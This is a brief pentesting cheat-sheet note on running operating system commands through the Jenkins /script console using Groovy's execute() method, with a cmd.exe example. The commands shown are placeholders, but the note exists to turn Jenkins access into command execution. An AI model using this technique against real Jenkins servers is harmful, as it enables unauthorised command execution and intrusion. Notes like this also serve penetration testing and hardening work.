# Jenkins
If you can access jenkins check for the endpoint which allows you to run scripts: 
```
/script 
```

Then for the script you can execute using the following: 
```
println "<command>".execute().text 
```

To call cmd.exe use: 
```
println "cmd.exe /c dir…."
```
